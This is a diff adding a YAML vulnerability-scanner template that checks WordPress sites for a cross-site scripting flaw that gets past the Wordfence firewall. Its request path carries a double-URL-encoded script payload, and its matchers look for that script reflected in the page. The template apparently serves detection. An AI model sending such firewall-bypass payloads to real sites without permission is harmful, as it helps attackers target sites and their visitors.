@@ -1,0 +1,34 @@
+id: "wordpress-wordfence-waf-bypass-xss"
+name: "Wordpress Wordfence - Cross-Site Scripting"
+severity: "medium"
+description: "Wordpress Wordfence is vulnerable to cross-site scripting."
+tech:
+  - "wordpress"
+tags:
+  - "wordpress"
+  - "wordfence"
+  - "xss"
+  - "bypass"
+  - "vuln"
+cwe: "CWE-80"
+reference: "https://twitter.com/naglinagli/status/1382082473744564226"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "<script>alert(document.domain)</script>"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
+  - type: "status"
+    status:
+      - 200
